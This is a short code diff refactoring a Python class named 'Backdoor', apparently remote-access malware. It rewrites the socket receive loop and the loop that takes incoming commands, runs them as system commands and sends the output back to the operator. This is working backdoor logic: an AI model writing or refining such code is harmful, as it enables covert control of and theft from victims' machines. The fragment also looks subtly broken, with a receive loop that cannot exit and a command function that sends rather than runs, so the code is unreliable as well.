@@ -16,10 +16,11 @@ class Backdoor:
         json_data = ''
         while True:
             try:
-                json_data += self.connection.recv(1024).decode('utf-8')
+                received_data = self.connection.recv(1024).decode('utf-8')
+                json_data += received_data
             except ValueError as e:
-                print(f"Error receiving data: {e}")
                 continue
+        return json_data
 
     def execute_system_command(self, command):
         self.send(command)
@@ -33,7 +34,7 @@ class Backdoor:
                 break
             
             result = self.execute_system_command(command)
-            self.connection.send(result)
+            self.send(result)
 
         self.connection.close()
 
